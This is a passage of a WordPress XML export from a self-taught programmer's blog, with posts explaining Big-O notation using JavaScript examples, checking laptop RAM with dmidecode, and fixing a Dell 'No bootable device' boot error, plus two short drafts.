		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cronjob-in-linux</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[25147658374]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Big-O notation - what is it? How does it work?</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/07/25/big-o-notation-what-is-it/</link>
		<pubDate>Mon, 25 Jul 2016 23:57:36 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1788</guid>
		<description></description>
		<content:encoded><![CDATA[I think it is like a rite of passage for a self-taught programmer to write this blog post. You will get to a point where you feel inadequate for not understanding the Big-O notation. You think it is some dark magic that they only teach at computer science programs at the university. Okay, so let's get to the bottom of this, well at least get through the basics.

First, Big-O notation helps us understand the complexity of an algorithm. And it always looks at the worst-case-scenario of an algorithm, the slowest possible outcome.
I am going to go through these types. In more practical terms, we are looking at understanding CPU-usage.

O(1) - Order of one
O(N) - Order of N

O(N + M)

O(N * M)
O(N^2) - Order of N squared
O(log N) - Order of log N
O(n log N) - Order of n log N
<h3>O(1) -<em> Constant-time algorithm</em></h3>
This is just a simple operation that takes the same amount of time to do no matter how big the number is. This is also called <strong>Constant-time algorithm.</strong>

For example

[code lang="js"]
var myArray = [];

//This will take as much time to perform as:
console.time(&amp;quot;n(1)&amp;quot;);
myArray.push(10);
console.timeEnd(&amp;quot;n(1)&amp;quot;);

// this

console.time(&amp;quot;n(1)&amp;quot;);
myArray.push(1000000000000000000000000000000000000000000000000);
console.timeEnd(&amp;quot;n(1)&amp;quot;);

[/code]
The complexity of this operation will never change no matter how big the number we push is. The push is only one operation, no matter how big the number is. This is usually represented as a flat line in an x/y diagram. It is the blue line in the image. As you can see the complexity of the algorithm doesn't increase if we increase the amount of data.

<img class="alignnone size-full wp-image-1843" src="https://stuffidontwanttogoogleagain.files.wordpress.com/2016/07/bigo.png" alt="bigO" width="526" height="378" />

&nbsp;
<h3>O(N) - Linear-time algorithm</h3>
So let's move on to the next on our list. So in this case the complexity is directly related to the size of the array we want to iterate over. Let's look at an example.

[code lang="js"]

console.time(&amp;quot;O(N)&amp;quot;);
for (var i = 0; i &amp;lt; 1e7; i++) {
}
console.timeEnd(&amp;quot;O(N)&amp;quot;);

console.time(&amp;quot;O(N)&amp;quot;);
for (var i = 0; i &amp;lt; 2e7; i++) {
}
console.timeEnd(&amp;quot;O(N)&amp;quot;);

console.time(&amp;quot;O(N)&amp;quot;);
for (var i = 0; i &amp;lt; 3e7; i++) {
}
console.timeEnd(&amp;quot;O(N)&amp;quot;);

console.time(&amp;quot;O(N)&amp;quot;);
for (var i = 0; i &amp;lt; 4e7; i++) {
}
console.timeEnd(&amp;quot;O(N)&amp;quot;);

//O(N): 13.415ms
//O(N): 21.307ms
//O(N): 30.151ms
//O(N): 39.580ms
[/code]

As we can see here it takes roughly nine milliseconds for each 10 million loop. This means that for every 10 million items we add to the loop the algorithm complexity increase will be linear. As you can see on the image above.
A more practical example would be. If you need to search through an array to find a specific item you need to iterate over every single item. Of course it could be that you find the number you are looking for after one iteration, it might be in the beginning of the array. But Big O notation assumes <strong>worst case scenario</strong>.
<h3>O(N+M)</h3>
Well, two loops iterating over their own dataset.

[code lang="js"]
var n = 10;
var m = 100;
for (var i = 0; i &amp;lt; n; i++) {
//Do stuff
}

for (var i = 0; i &amp;lt; m; i++) {
//Do stuff
}
[/code]
<h3>O(N^2) - Quadratic-time algorithm</h3>
So far so good, nothing to complicated. Now let's look at O(N^2).

Let's say you are given an array with numbers. You are then asked to find out if it is possible to get the number 10 by adding two of the numbers in the array together. To do this you could write the following code.

[code lang="js"]
function findSum(arr, sum){
  for(var i = 0; i &amp;lt; arr.length - 1; i++){
    for(var j = i + 1; j &amp;lt; arr.length; j++){
      if (arr[i] + arr[j] == sum)
    return true;
    }
  }

 return false;
}
[/code]

&nbsp;

This is like a brute-force attempt. We are just trying every single possible combination until we get a success. This is not very efficient, but it works. And if the size of the array increases the run time complexity will increase exponentially. If there are five items in the array it must loop through it<strong> 5^2</strong>. This can pretty soon generate code that needs to do so many iterations. By increasing it from <strong>5^2 (25)</strong> to<strong> 6^2 (36)</strong> we just increase the array with one (one more item in the array), but we increase the number of iterations by <strong>36 - 25 = 11</strong>.

A practical example of this would be the bubble sort.

If you have three loops nested we get O(N^3), and so on. This is course gets slow fast, so if you notice you have a O(N^2) or a O(N^3) algorithm you should probably think of ways to fix it.

To pronounce this you say "<strong>big oh of n squared</strong>".
<h3>O(N*M)</h3>
Not all nested loops are <strong>O(N^2). </strong>For example, the following would not be O(N^2).

[code lang="js"]
var arrayOne = 10;
var arrayTwo = 100;

for (var i = 0; i &lt; arrayOne.length; i++) {
for (var j = 0; j &lt; arrayTwo.length; j++) {
}
}
[/code]

Since we are iterating over another loop inside the first loop we are not looping <strong>n^2</strong>, but instead we are looping <strong>n*m</strong>.
<h2>O(log N) - Logarithmic</h2>
Log is the shorthand for logarithm. And logarithm is the opposite of exponential. A concept I am more familiar with, so it helps me to understand logarithm.

This is a great description.
O(log n) can be seen as: If you double the problem size n, your algorithm needs only a constant number of steps more.

Image
<img src="http://science.larouchepac.com/gauss/ceres/InterimII/Arithmetic/Primes/Log_Exp_inverts.jpg" />

&nbsp;

Okay, this might freak someone out. Since it look way to math-ish. So instead let's look at a video. Minute 17-25.

https://www.youtube.com/watch?v=zFenJJtAEzE

This is an amazing explanation.
https://stackoverflow.com/questions/9152890/what-would-cause-an-algorithm-to-have-olog-n-complexity

https://stackoverflow.com/questions/9152890/what-would-cause-an-algorithm-to-have-olog-n-complexity

A good example of O(log N) is binary tree search.

Example
Finding a number in an array, the Binary Tree Search-way. Or the O(log N)-way.

&nbsp;

References

This is a great reference to algorithms that state their complexity with big-o.

http://www.thatjsdude.com/interview/js1.html

http://discrete.gr/complexity/

Nested loops
https://stackoverflow.com/questions/362059/what-is-the-big-o-of-a-nested-loop-where-number-of-iterations-in-the-inner-loop

https://www.youtube.com/watch?v=V6mKVRU1evU
https://justin.abrah.ms/computer-science/big-o-notation-explained.html]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1788</wp:post_id>
		<wp:post_date>2016-07-25 23:57:36</wp:post_date>
		<wp:post_date_gmt>2016-07-25 23:57:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>big-o-notation-what-is-it</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_oembed_16cf4bb63e1b0567be14d694515748b8</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[25152729265]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_e24aab004cd6b8a4652e8b2e8bc46c78</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_9f994cdadbb1ccf92d865672470e5e76</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_cf114e3c0a23ca056836b22b507f4662</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_3b2fde29c5a0ecda03ab319f6bebbd8d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0368fb70a887463560c883a34786d2b8</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_06452fc8201dffeaca1cf9e84a36bea2</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_68a7be2c041bbe8bc1fd9da1f2d7ea96</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_1170b795e7dc7ead6bac557bfef0cf9c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_f00c85c8c57ee8be2d9101982f85bbe7</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_42ad758959d70fb338b2b6b1cb81da2f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_6994c4bb5b2e20945794ef749dc04336</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_86197eafc897664d7766a10bcb82114b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_23282be30d6aa7ce76ef9456bdaafcdb</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_9758b7b43199a713d00c6d77b311eac9</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>bigO</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/07/25/big-o-notation-what-is-it/bigo/</link>
		<pubDate>Tue, 26 Jul 2016 12:55:45 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">http://stuffidontwanttogoogleagain.files.wordpress.com/2016/07/bigo.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1843</wp:post_id>
		<wp:post_date>2016-07-26 12:55:45</wp:post_date>
		<wp:post_date_gmt>2016-07-26 12:55:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>bigo</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>1788</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>https://stuffidontwanttogoogleagain.files.wordpress.com/2016/07/bigo.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2016/07/bigo.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:5:{s:5:"width";i:526;s:6:"height";i:378;s:4:"file";s:81:"/home/wpcom/public_html/wp-content/blogs.dir/a4d/108528383/files/2016/07/bigo.png";s:5:"sizes";a:0:{}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Tests - Explain it please</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=1850</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1850</guid>
		<description></description>
		<content:encoded><![CDATA[Sure, since you are asking so nicely.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1850</wp:post_id>
		<wp:post_date>2016-07-29 21:27:19</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
	</item>
	<item>
		<title>Book Review - The Pragmatic Programmer</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/?p=1852</link>
		<pubDate>Mon, 30 Nov -0001 00:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1852</guid>
		<description></description>
		<content:encoded><![CDATA[The most beloved programming book out there. On top of all the lists.
<h3>Completely unstructured thoughts</h3>
I really like the idea of applying Broken window theory to code. Don't leave any broken windows in your application. Poor code, bad design, must be fixed so the whole project doesn't turn into a dump of crap code. <strong>Neglect accelerates rot</strong>.

I am not a big fan of quotes, but this is a pretty good one.
<blockquote>An investment in knowledge always pays the best interest.
Benjamin Franklin</blockquote>
Wow. I have learned about DRY code, but I didn't know the concept (or acronym) came from this book.
<h3>Orthogonality</h3>
So the concept is basically means that if you change one thing you don't need to change a lot of other things. Pretty obvious, but still good to have a word for it. And always aim to write orthogonal systems. Systems where if you change a variable at one po]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1852</wp:post_id>
		<wp:post_date>2016-07-30 22:36:31</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
	</item>
	<item>
		<title>Memory card - How does it work?</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/07/31/memory-card-how-does-it-work/</link>
		<pubDate>Sun, 31 Jul 2016 16:18:14 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1871</guid>
		<description></description>
		<content:encoded><![CDATA[My notebook is a bit slow. I only have 4 gb of ram. So I want to upgrade it a bit.

First thing first. What do I have now?
<pre>sudo dmidecode --type memory</pre>
This gives us all the info we need about the current memory in out computer.
<pre>
# dmidecode 3.0
Getting SMBIOS data from sysfs.
SMBIOS 2.8 present.

Handle 0x005B, DMI type 16, 23 bytes
<strong>Physical Memory Array</strong>
Location: System Board Or Motherboard
Use: System Memory
Error Correction Type: None
Maximum Capacity: 16 GB
Error Information Handle: Not Provided
Number Of Devices: 2

Handle 0x0060, DMI type 17, 34 bytes
<strong>Memory Device</strong>
Array Handle: 0x005B
Error Information Handle: Not Provided
Total Width: 64 bits
Data Width: 64 bits
Size: 4096 MB
Form Factor: SODIMM
Set: None
Locator: DIMM A
Bank Locator: Not Specified
Type: DDR3
Type Detail: Synchronous
Speed: 1600 MHz
Manufacturer: Micron
Serial Number: CFC29B80
Asset Tag: 9876543210
Part Number: 8KTF31561HK-1G6E1
Rank: 1
Configured Clock Speed: 1600 MHz

Handle 0x0065, DMI type 17, 34 bytes
<strong>Memory Device</strong>
Array Handle: 0x005B
Error Information Handle: Not Provided
Total Width: Unknown
Data Width: Unknown
Size: No Module Installed
Form Factor: DIMM
Set: None
Locator: DIMM B
Bank Locator: Not Specified
Type: Unknown
Type Detail: None
Speed: Unknown
Manufacturer: Not Specified
Serial Number: Not Specified
Asset Tag: Not Specified
Part Number: Not Specified
Rank: Unknown
Configured Clock Speed: Unknown

</pre>
In the first section we can see that the maximum-capacity of this computer is 16gb of memory and that the there is space for two devices. In other words, it has two slots for memory. So I guess I can add two 8gb of memory without problem.

Then it lists the current memories I have installed. As you can see I only have one memory installed, on the first slot. And it appears to be a 4gb memory. What is important to note here it the type. Is says here that it is a DDR3. So my new memory must be a DDR3, if cannot be DDR2 or DDR4. Motherboards are usually only able to support one memory-type.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1871</wp:post_id>
		<wp:post_date>2016-07-31 16:18:14</wp:post_date>
		<wp:post_date_gmt>2016-07-31 16:18:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>memory-card-how-does-it-work</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[25336725751]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>How to fix: &quot;No bootable device&quot; on Dell Inspiron 3458</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2016/08/01/how-to-fix-no-bootable-device-on-dell-inspiron-3458/</link>
		<pubDate>Mon, 01 Aug 2016 01:59:10 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://stuffidontwanttogoogleagain.wordpress.com/?p=1895</guid>
		<description></description>
		<content:encoded><![CDATA[I bought a new disk, a SSD. I am using a Dell Inspiron 3458. So I open up the computer and changed the disk, no problem so far. Really easy process. Then I rebooted and installed the OS, still no problem. But then when I tried to boot up the machine again a got hit with a scary error.

I can't remember exactly what it said, but it was something like this
<pre>No bootable device

Press F2 to enter bios-configuration

Press F5 to reboot</pre>
And some other stuff.

I was lost. So I started the great google-hunt. Read through a ton of blog-posts and videos, and everything I could get my hands on. I tried to change the boot-order to legacy mode. But nothing worked. In the system info in bios I could see that the machine recognized the disk, it just couldn't find it when I booted up.

Then I found this blog-post: https://itsfoss.com/no-bootable-device-found-ubuntu/. But it was written for an Acer Aspire. But I felt like this was the same issue as I had. And in the comments I found my anonymous hero Chris, who wrote the following comment:
<pre>I have a Dell Inspiron, I followed your process, more-or-less, but from step 3 (“Select an UEFI file as trusted for executing”) onwards I had to do something slightly different in the BIOS:

– Settings → General → Boot Sequence
– Press “Add Boot Option”
– Boot Option Name: ubuntu (I don’t think this matters much, but this seems like a sensible name)
– File Name: press the browse button, and as in the instructions above, find the shimx64.efi boot file
– Save this boot option
– Exit the BIOS, and with any luck your computer will now boot

</pre>
I followed these steps and it worked perfectly.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1895</wp:post_id>
		<wp:post_date>2016-08-01 01:59:10</wp:post_date>
		<wp:post_date_gmt>2016-08-01 01:59:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>how-to-fix-no-bootable-device-on-dell-inspiron-3458</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1959580]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>geo_public</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[25348544777]]></wp:meta_value>
		</wp:postmeta>
	</item>
</channel>
</rss>
